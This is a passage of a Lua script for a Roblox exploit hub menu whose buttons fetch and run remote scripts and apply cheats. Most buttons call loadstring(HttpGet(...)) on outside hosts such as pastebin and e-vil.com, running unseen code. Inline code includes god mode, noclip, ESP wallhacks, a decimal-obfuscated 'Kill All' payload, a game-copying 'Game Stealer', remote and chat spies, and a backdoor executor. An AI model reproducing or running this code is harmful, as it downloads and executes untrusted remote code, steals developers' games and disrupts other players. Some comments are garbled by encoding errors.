    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty1.lua"))()
end)

sectionFE:NewButton("FE no Gravity?", "Controls all players", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/Roblox-Scripts/refs/heads/main/0%20Graviy%20Trip%20Universal"))()
end)

sectionFE:NewButton("FE Telekinesis V5", "Telekinesis", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua"))()
end)

sectionFE:NewButton("FE Part Blackhole", "Blackhole radius", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/joca-black-hole/refs/heads/main/README.md'))()
end)

sectionFE:NewButton("FE Car", "Drive car hat", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexCr4sh/FeScripts/main/FeCarScript.lua", true))()
end)

sectionFE:NewButton("FE Super Ring V4", "Like blackhole", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Super-ring-V4-24296"))()
end)

sectionFE:NewButton("FE Invisible", "GHOST", function()
     loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
end)

sectionFE:NewToggle("FE God Mode", "Constant Full Health", function(state)
    if state then
        local plr = game.Players.LocalPlayer
        local char = plr.Character or plr.CharacterAdded:Wait()
        local hum = char:WaitForChild("Humanoid")

        -- Update if character respawns
        plr.CharacterAdded:Connect(function(c)
            char = c
            hum = char:WaitForChild("Humanoid")
        end)

        -- Fix health but make it appear low in GUI
        game:GetService("RunService").Heartbeat:Connect(function()
            if hum and hum.Health > 0 then
                -- Keep real health
                hum.Health = hum.MaxHealth
                hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

                -- Give fake value to appear low in GUI
                hum.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOn
                hum.NameDisplayDistance = 0
                hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
            end
        end)
    end
end)

--==============
--    FE V2
--==============
FESection:NewButton("Invencible fly", "Invencible fly", function()
local UserInputService = game:GetService("UserInputService")

local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

if isMobile then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/MobileFly.lua"))()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/FlyR15.lua"))()
end
end)

FESection:NewToggle("FE Silly Ball", "FE", function()
    local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
 
local SPEED_MULTIPLIER = 30
local JUMP_POWER = 60
local JUMP_GAP = 0.3
 
local character = game.Players.LocalPlayer.Character
 
for i,v in ipairs(character:GetDescendants()) do
   if v:IsA("BasePart") then
       v.CanCollide = false
   end
end
 
local ball = character.HumanoidRootPart
ball.Shape = Enum.PartType.Ball
ball.Size = Vector3.new(5,5,5)
local humanoid = character:WaitForChild("Humanoid")
local params = RaycastParams.new()
params.FilterType = Enum.RaycastFilterType.Blacklist
params.FilterDescendantsInstances = {character}
 
local tc = RunService.RenderStepped:Connect(function(delta)
   ball.CanCollide = true
   humanoid.PlatformStand = true
if UserInputService:GetFocusedTextBox() then return end
if UserInputService:IsKeyDown("W") then
ball.RotVelocity -= Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("A") then
ball.RotVelocity -= Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("S") then
ball.RotVelocity += Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("D") then
ball.RotVelocity += Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
--ball.RotVelocity = ball.RotVelocity - Vector3.new(0,ball.RotVelocity.Y/50,0)
end)
 
UserInputService.JumpRequest:Connect(function()
local result = workspace:Raycast(
ball.Position,
Vector3.new(
0,
-((ball.Size.Y/2)+JUMP_GAP),
0
),
params
)
if result then
ball.Velocity = ball.Velocity + Vector3.new(0,JUMP_POWER,0)
end
end)
 
Camera.CameraSubject = ball
humanoid.Died:Connect(function() tc:Disconnect() end)
end)

FESection:NewButton("FE Gale Fighter", "FE gale fighter Script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/gale", true))()
end)

FESection:NewButton("FE Grab parts", "FE Grab Parts", function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Throw settings (default values)
local throwForce = 50
local throwUpForce = 10

-- Tool logic
local grabTool = Instance.new("Tool")
grabTool.Name = "Grab"
grabTool.RequiresHandle = false

local handle = Instance.new("Part")
handle.Name = "Handle"
handle.Size = Vector3.new(0.5, 0.5, 0.5)
handle.Transparency = 1
handle.CanCollide = false
handle.Parent = grabTool

-- Add tool to inventory
grabTool.Parent = player.Backpack

-- Grab tool functionality
local mouse = player:GetMouse()
local heldModel = nil
local originalCollisions = {}
local bodyVelocity = nil

local function disableModelCollisions(model)
    originalCollisions = {}
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            originalCollisions[part] = part.CanCollide
            part.CanCollide = false
        end
    end
end

local function restoreModelCollisions()
    for part, canCollide in pairs(originalCollisions) do
        if part and part.Parent then
            part.CanCollide = canCollide
        end
    end
    originalCollisions = {}
end

local function pullItem(target)
    if heldModel then return end
    
    heldModel = target:FindFirstAncestorOfClass("Model") or target
    disableModelCollisions(heldModel)
    
    local primaryPart = heldModel.PrimaryPart or heldModel:FindFirstChildWhichIsA("BasePart")
    if not primaryPart then return end
    
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVelocity.Parent = primaryPart
    
    game:GetService("RunService").Heartbeat:Connect(function()
        if not heldModel or not bodyVelocity then return end
        
        local handlePos = grabTool.Handle.Position
        local partPos = primaryPart.Position
        local direction = (handlePos - partPos).Unit * 50
        
        bodyVelocity.Velocity = direction
    end)
end

local function throwItem()
    if not heldModel then return end
    
    local primaryPart = heldModel.PrimaryPart or heldModel:FindFirstChildWhichIsA("BasePart")
    if not primaryPart then return end
    
    restoreModelCollisions()
    
    if bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
    
    local camera = workspace.CurrentCamera
    local throwDirection = (mouse.Hit.Position - camera.CFrame.Position).Unit
    
    local throwVelocity = Instance.new("BodyVelocity")
    throwVelocity.Velocity = throwDirection * throwForce + Vector3.new(0, throwUpForce, 0)
    throwVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    throwVelocity.Parent = primaryPart
    
    game:GetService("Debris"):AddItem(throwVelocity, 0.5)
    
    heldModel = nil
end

grabTool.Activated:Connect(function()
    if not grabTool.Parent:IsA("Model") then return end
    
    if heldModel then
        throwItem()
        return
    end
    
    local target = mouse.Target
    if target and not target.Anchored and not target:IsDescendantOf(character) then
        pullItem(target)
    end
end)
end)

FESection:NewButton("FE Free Gamepass", "only in some games, check list in script", function()
    getgenv().Color = "blue" --[[white,black, brown,green,cyan,blue,pink,purple,red,yellow,orange ]]--
getgenv().TextColor = "default" --[[ rgb,white,black, brown,green,cyan,blue,pink,purple,red,yellow,orange ]]--
loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Server87"))()
end)

FESection:NewButton("FE bring players", "FE gale fighter Script", function()
    loadstring(game:HttpGet("https://pastefy.app/hyUtqlPV/raw", true))()
end)

FESection:NewButton("FE Cat Script", "FE Cat Script", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Y1MkBRn3"))()
end)

FESection:NewButton("FE Universal Hitbox Extender", "FE Universal Hitbox Extender", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/joca-black-hole/refs/heads/main/README.md'))()
end)

FESection:NewButton("FE Touch Fling", "FE Touch Fling", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/joca-fling/refs/heads/main/README.md'))()
end)

FESection:NewButton("FE Part Invisiblty", "FE Part Invisiblty", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/hiuDUqFS"))()
end)

FESection:NewButton("FE Choke", "FE Choke", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/shakk-code/fe-choke-script/refs/heads/main/script.lua', true))()
end)

FESection:NewButton("Joca backdoor Executor", "only in backdoored games", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/joca-executor/refs/heads/main/README.md'))()
end)

FESection:NewButton("FE Gravity Gun", "FE Gravity Gun", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/gravity%20gun"))()
end)

FESection:NewButton("FE Audio Spam", "FE", function()
	loadstring(game:HttpGet('https://pastebin.com/raw/v7Usg709', true))()
end)

FESection:NewButton("FE Scp 096(r6)", "FE Scp 096", function()
    loadstring(game:HttpGet("https://pastefy.app/YsJgITXR/raw"))()
end)

FESection:NewButton("FE Roblox Egor", "FE Roblox Egor", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GithubMagical/Roblox-Egor/refs/heads/main/lua%20v2", true))()
end)

FESection:NewButton("Driving in my car (COOL ASF)(Fling people)", "driving in my car right after a beer", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/idbiRMZG"))()
end)

FESection:NewButton("FE Bang", "FE Bang", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/4gh9/Bang-Script-Gui/main/bang%20gui.lua'))()
end)

FESection:NewButton("FE Universal Viewer", "FE Universal Viewer", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/KmiuAFZh"))()
end)

FESection:NewButton("FE Chat Spy", "FE Chat Spy", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/CHAT%20SPY%20-%202025/ChatSpy2025.lua', true))()
end)

FESection:NewButton("FE Kill All(Sword)", "Sword Needed", function()
    loadstring("\108\111\99\97\108\32\76\80\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\10\119\104\105\108\101\32\119\97\105\116\40\48\46\49\41\32\100\111\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\58\71\101\116\80\108\97\121\101\114\115\40\41\41\32\100\111\10\105\102\32\118\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\32\97\110\100\32\118\32\126\61\32\76\80\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\116\104\101\110\10\108\111\99\97\108\32\104\114\112\32\61\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\10\104\114\112\58\66\114\101\97\107\74\111\105\110\116\115\40\41\10\104\114\112\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\10\104\114\112\46\66\114\105\99\107\67\111\108\111\114\32\61\32\118\46\84\101\97\109\67\111\108\111\114\10\104\114\112\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\104\114\112\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10\104\114\112\46\67\70\114\97\109\101\32\61\32\76\80\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\42\32\67\70\114\97\109\101\46\110\101\119\40\49\44\48\44\45\51\46\53\41\10\101\110\100\41\10\101\110\100\10\101\110\100\10\101\110\100\10")()
end)

FESection:NewToggle("Collision Enabler", "Collision Enabler", function(state)
    if state then
        LP = game.Players.LocalPlayer
        while state and wait(3) do
            for i,v in pairs(game.Players:GetDescendants()) do
                if v:IsA("Player") and workspace:FindFirstChild(v.Name) and v ~= LP and workspace[v.Name]:FindFirstChild("CHECKER") == nil then
                    checker = Instance.new("BoolValue",workspace[v.Name])
                    checker.Name = "CHECKER"
                    for i,v in pairs(workspace:WaitForChild(v.Name):GetDescendants()) do
                        if v:IsA("Part") or v:IsA("MeshPart") then
                            local collider = Instance.new("Part",v)
                            collider.Size = v.Size
                            collider.Position = v.Position
                            collider.Transparency = 1
                            local weld = Instance.new("Weld",v)
                            weld.Part0 = v
                            weld.Part1 = collider
                        end
                    end
                end
            end
        end
    end
end)

--================
--CREATE SCRIPTS
--================

spySection:NewButton("Game Stealer", "Game copier", function()
    local Params = {
 RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
 SSI = "saveinstance",
}
local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
local Options = {} -- Documentation here https://luau.github.io/UniversalSynSaveInstance/api/SynSaveInstance
synsaveinstance(Options)
end)

spySection:NewButton("Dex Explorer", "Advanced explorer tool", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

spySection:NewButton("Ketamine HUB(very good)", "Ketamine HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()
end)

spySection:NewButton("Simple SPY(better for low devices)", "Remote SPY", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
end)

spySection:NewButton("Sigma Spy", "Sigma Spy", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/depthso/Sigma-Spy/refs/heads/main/Main.lua"))()
end)

spySection:NewButton("Console Spy", "ROBLOX UNIVERSAL REMOTE EVENT SCANNER", function()
    -- Function to recursively search for RemoteEvents in a given instance
local function findRemoteEvents(instance)
    for _, child in ipairs(instance:GetChildren()) do
        if child:IsA("RemoteEvent") then
            print(child:GetFullName()) -- Prints the full path of the RemoteEvent
        end
        findRemoteEvents(child)
    end
end

-- Start the search from the game's Workspace, ReplicatedStorage, and ReplicatedFirst
findRemoteEvents(game.Workspace)
findRemoteEvents(game.ReplicatedStorage)
findRemoteEvents(game.ReplicatedFirst)
end)

-- SERVICES
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

-- VARIABLES
local LocalPlayer = Players.LocalPlayer
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

-- TRACK CHARACTER CHANGES
LocalPlayer.CharacterAdded:Connect(function(newChar)
    character = newChar
    humanoid = newChar:WaitForChild("Humanoid")
    rootPart = newChar:WaitForChild("HumanoidRootPart")
end)

--=============
-- CLIENT MODS
--===============

-- Speed slider
sectionPlayer:NewSlider("Speed", "Adjusts walk speed", 500, 16, function(val)
    if humanoid then humanoid.WalkSpeed = val end
end)

-- Jump slider
sectionPlayer:NewSlider("Jump Power", "Adjusts jump power", 300, 50, function(val)
    if humanoid then humanoid.JumpPower = val end
end)

-- Jump power fix button
sectionPlayer:NewButton("Fix Jump Power", "", function()
    if humanoid then
        humanoid.UseJumpPower = true
    end
end)

-- auto jumpe
sectionPlayer:NewButton("Auto Jump(G)", "", function()
    local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local jumping = false
local gKeyConnection = nil

local function startJumping()
    task.spawn(function()
        while jumping do
            if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
            task.wait(0.01)
        end
    end)
end

local function toggleJumping()
    jumping = not jumping
    if jumping then
        startJumping()
    else
    end
end

-- Fun￯﾿ﾃ￯ﾾﾧ￯﾿ﾃ￯ﾾﾣo para detectar tecla G
local function setupGKeyListener()
    if gKeyConnection then
        gKeyConnection:Disconnect()
    end
    
    gKeyConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end -- N￯﾿ﾃ￯ﾾﾣo processar se o jogo est￯﾿ﾃ￯ﾾﾡ usando o input
        
        if input.KeyCode == Enum.KeyCode.G then
            toggleJumping()
            updateGUI()
        end
    end)
end

local function createGUI()
    if player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("AutoJumpGUI") then
        player.PlayerGui.AutoJumpGUI:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.Name = "AutoJumpGUI"
    screenGui.ResetOnSpawn = false

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 70, 0, 70)
    button.Position = UDim2.new(0.1, 0, 0.1, 0)
    button.Text = jumping and "ON\n(G)" or "OFF\n(G)"
    button.BackgroundColor3 = jumping and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    button.BackgroundTransparency = 0.75
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0.3, 0)
    corner.Parent = button
    
    -- Tamb￯﾿ﾃ￯ﾾﾩm permite clicar no bot￯﾿ﾃ￯ﾾﾣo
    button.MouseButton1Click:Connect(function()
        toggleJumping()
        updateGUI()
    end)

    -- Sistema de arrastar
    local dragging, dragInput, dragStart, startPos
    local function update(input)
        local delta = input.Position - dragStart
        button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = button.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    button.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

-- Fun￯﾿ﾃ￯ﾾﾧ￯﾿ﾃ￯ﾾﾣo para atualizar a GUI
local function updateGUI()
    if player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("AutoJumpGUI") then
        local button = player.PlayerGui.AutoJumpGUI:FindFirstChildOfClass("TextButton")
        if button then
            button.Text = jumping and "ON\n(G)" or "OFF\n(G)"
            button.BackgroundColor3 = jumping and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
        end
    end
end

-- Inicializar
createGUI()
setupGKeyListener()

-- Notifica￯﾿ﾃ￯ﾾﾧ￯﾿ﾃ￯ﾾﾣo de ajuda
task.spawn(function()
    wait(2)
    StarterGui:SetCore("SendNotification", {
        Title = "AutoJump",
        Text = "Pressione G para ativar/desativar",
        Duration = 3
    })
end)

-- Reconectar quando o character mudar
player.CharacterAdded:Connect(function(newChar)
    character = newChar
    humanoid = character:WaitForChild("Humanoid")
    task.wait(0.5) -- Esperar o character carregar completamente
    
    -- Resetar estado do pulo
    jumping = false
    
    -- Recriar GUI e listeners
    createGUI()
    setupGKeyListener()
    
    print("￯﾿ﾰ￯ﾾﾟ￯ﾾﾔ￯ﾾﾁ Character carregado - AutoJump pronto (Tecla G)")
end)

-- Limpeza quando o script for destru￯﾿ﾃ￯ﾾﾭdo
game:GetService("ScriptContext").DescendantRemoving:Connect(function(descendant)
    if descendant == script then
        if gKeyConnection then
            gKeyConnection:Disconnect()
        end
    end
end)
end)

sectionPlayer:NewToggle("Infinite Jump", "Jump as much as you want", function(state)
    local UserInputService = game:GetService("UserInputService")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    
    local connection
    
    if state then
        -- Ativar Infinite Jump
        connection = UserInputService.JumpRequest:Connect(function()
            if player.Character then
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
        
        -- Reconectar quando o personagem mudar
        player.CharacterAdded:Connect(function()
            if connection then
                connection:Disconnect()
            end
            task.wait(0.5)
            connection = UserInputService.JumpRequest:Connect(function()
                if player.Character then
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end
            end)
        end)
        
    else
        -- Desativar Infinite Jump
        if connection then
            connection:Disconnect()
            connection = nil
        end
    end
end)

-- Noclip toggle
local noclipConn
sectionPlayer:NewToggle("Noclip", "Walk through obstacles", function(state)
    if noclipConn then noclipConn:Disconnect() end
    if state then
        noclipConn = RunService.Stepped:Connect(function()
            if character then
                for _,part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end)
    end
end)

-- rejoin
sectionPlayer:NewButton("Rejoin", "Rejoin The Game", function(state)
    local ts = game:GetService("TeleportService")
    local plr = game:GetService("Players").LocalPlayer
    
    pcall(function()
        ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
    end)
end)

-- serverhop
sectionPlayer:NewButton("Server Hop", "Hop to a different server", function(state)
    local ts = game:GetService("TeleportService")
    local plr = game:GetService("Players").LocalPlayer
    
    pcall(function()
        ts:Teleport(game.PlaceId, plr)
    end)
end)

-- reset character
sectionPlayer:NewButton("Reset Player", "Resets your character", function()
    local plr = game.Players.LocalPlayer
    local char = plr.Character
    
    if char then
        -- Method 1: BreakJoints (primary)
        char:BreakJoints()
        
        -- Method 2: Humanoid health (backup)
        if char:FindFirstChild("Humanoid") then
            char.Humanoid.Health = 0
        end
    end
end)

-- Anti Fall Damage toggle
local afdConn
sectionExtras:NewToggle("Anti Fall Damage", "No damage when falling", function(state)
    if afdConn then afdConn:Disconnect() end
    if state then
        afdConn = RunService.Stepped:Connect(function()
            if humanoid and humanoid:GetState() == Enum.HumanoidStateType.Freefall then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    end
end)

-- Sit toggle (single key sit/stand)
local sitToggle = false
sectionExtras:NewToggle("Sit Toggle(Z)", "Single key sit/stand", function(state)
    sitToggle = state
    if not sitToggle and humanoid then
        humanoid.Sit = false
    end
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if sitToggle and input.KeyCode == Enum.KeyCode.Z and humanoid then
        humanoid.Sit = not humanoid.Sit
    end
end)

-- ESP SYSTEM
local espEnabled = false
local nameEspEnabled = false
local boxEspEnabled = false
local espObjects = {}

local function clearESP()
    for _,v in pairs(espObjects) do
        if v and v.Parent then
            v:Destroy()
        end
    end
    espObjects = {}
end

local function updateESP()
    clearESP()
    if not espEnabled and not nameEspEnabled and not boxEspEnabled then return end
    
    for _,plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            if espEnabled then
                local highlight = Instance.new("Highlight")
                highlight.Adornee = plr.Character
                highlight.FillColor = plr.TeamColor.Color
                highlight.OutlineColor = Color3.new(1,1,1)
                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                highlight.Parent = CoreGui
                table.insert(espObjects, highlight)
            end
            
            local head = plr.Character:FindFirstChild("Head")
            if nameEspEnabled and head then
                local bb = Instance.new("BillboardGui")
                bb.Adornee = head
                bb.Size = UDim2.new(0, 150, 0, 40)
                bb.AlwaysOnTop = true
                bb.Parent = CoreGui
                
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.TextColor3 = Color3.new(1, 1, 1)
                label.TextScaled = true
                label.Text = plr.Name
                label.Parent = bb
                
                table.insert(espObjects, bb)
            end
            
            if boxEspEnabled then
                local box = Instance.new("BoxHandleAdornment")
                box.Adornee = plr.Character.HumanoidRootPart
                box.Size = Vector3.new(4, 6, 1)
                box.Color3 = plr.TeamColor.Color
                box.Transparency = 0.5
                box.AlwaysOnTop = true
                box.Parent = CoreGui
                table.insert(espObjects, box)
            end
        end
    end
end

sectionESP:NewToggle("Enable ESP", "Team colored name box", function(state)
    espEnabled = state
    updateESP()
end)

sectionESP:NewToggle("Name ESP", "Show player names", function(state)
    nameEspEnabled = state
    updateESP()
end)

sectionESP:NewToggle("Box ESP", "Show with box", function(state)
    boxEspEnabled = state
    updateESP()
end)

-- Listen to player changes
local function onPlayerAdded(plr)
    plr.CharacterAdded:Connect(function()
        updateESP()
    end)
    plr.CharacterRemoving:Connect(function()
        updateESP()
    end)
    updateESP()
end

local function onPlayerRemoving(plr)
    updateESP()
end

for _,plr in pairs(Players:GetPlayers()) do
    onPlayerAdded(plr)
end

Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)

-- ================
-- EXTRAS BUTTONS
-- ===============
sectionExtras:NewButton("Fps Booster(IRREVERSIBLE)", "fps booster", function()
    loadstring(game:HttpGet("https://pastefy.app/MStj0C2l/raw"))()
-- ANTI-TEXTURAS NUCLEAR - Joca Hub
-- Remove TODAS as texturas permanentemente, irreversￃﾭvel

local TexturesDestroyed = 0
local NuclearActive = true

-- Funￃﾧￃﾣo nuclear que DESTRￃﾓI qualquer textura
local function NuclearTextureDestroyer(obj)
    if not NuclearActive then return end
    
    if obj:IsA("Decal") or obj:IsA("Texture") then
        pcall(function()
            obj:Destroy()
            TexturesDestroyed = TexturesDestroyed + 1
            
            if obj:IsA("Decal") then
                obj.Texture = ""
            elseif obj:IsA("Texture") then
                obj.Texture = ""
            end
        end)
    end
end

-- Destrￃﾳi todas as texturas existentes
for _, obj in pairs(game:GetDescendants()) do
    NuclearTextureDestroyer(obj)
end

-- Conexￃﾣo para novas texturas
local InterceptConnection
InterceptConnection = game.DescendantAdded:Connect(function(obj)
    NuclearTextureDestroyer(obj)
end)

-- Loop infinito de verificaￃﾧￃﾣo
spawn(function()
    while NuclearActive do
        for _, obj in pairs(workspace:GetDescendants()) do
            NuclearTextureDestroyer(obj)
        end
        wait(5)
    end
end)

-- Monitora mudanￃﾧas em decais/texturas existentes
for _, obj in pairs(game:GetDescendants()) do
    if obj:IsA("Decal") then
        pcall(function()
            obj:GetPropertyChangedSignal("Texture"):Connect(function()
                NuclearTextureDestroyer(obj)
            end)
        end)
    elseif obj:IsA("Texture") then
        pcall(function()
            obj:GetPropertyChangedSignal("Texture"):Connect(function()
                NuclearTextureDestroyer(obj)
            end)
        end)
    end
end

-- Sistema de sobrevivￃﾪncia a respawns
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
    wait(1)
    for _, obj in pairs(game:GetDescendants()) do
        NuclearTextureDestroyer(obj)
    end
end)

-- Converte tudo para plￃﾡstico
spawn(function()
    while NuclearActive do
        for _, part in pairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                pcall(function()
                    part.Material = Enum.Material.Plastic
                    part.Reflectance = 0
                end)
            end
        end
        wait(10)
    end
end)

-- Comando para desativar
_G.DisableNuclearTextures = function()
    NuclearActive = false
    if InterceptConnection then
        InterceptConnection:Disconnect()
    end
end
end)

sectionExtras:NewButton("Executor Checker", "Executor Checker", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RealBatu20/AI-Scripts-2025/refs/heads/main/ExecutorTestsPanel.lua"))()
end)

sectionExtras:NewButton("Invisible Map(=)", "Executor Checker", function()
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local invisible = false
local lastToggle = 0
local debounceTime = 0.3

local function setVisibility(state)
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			obj.LocalTransparencyModifier = state and 1 or 0
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			obj.Transparency = state and 1 or 0
		end
	end
end

UserInputService.InputBegan:Connect(function(input, processed)
	if processed then return end
	if input.KeyCode == Enum.KeyCode.Equals and tick() - lastToggle > debounceTime then
		invisible = not invisible
		setVisibility(invisible)
		lastToggle = tick()
	end
end)

workspace.DescendantAdded:Connect(function(obj)
	if invisible then
		if obj:IsA("BasePart") then
			obj.LocalTransparencyModifier = 1
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			obj.Transparency = 1
		end
	end
end)

end)
sectionExtras:NewButton("Wally West(HOLD Q)", "Wally West", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua'))()
end)

sectionExtras:NewButton("Shaders", "Cool graphics", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/VDxFA1Ze"))()
end)

sectionExtras:NewButton("Simple Exploit Maker", "Simple Exploit Maker", function()
    loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
end)

sectionExtras:NewButton("sUNC Tester", "sUNC test check console", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-sUNC-Executor-script-59257"))()
end)

sectionExtras:NewButton("UNC Tester", "UNC test check console", function()
    loadstring(game:HttpGet("https://github.com/ltseverydayyou/uuuuuuu/blob/main/UNC%20test?raw=true"))()
end)

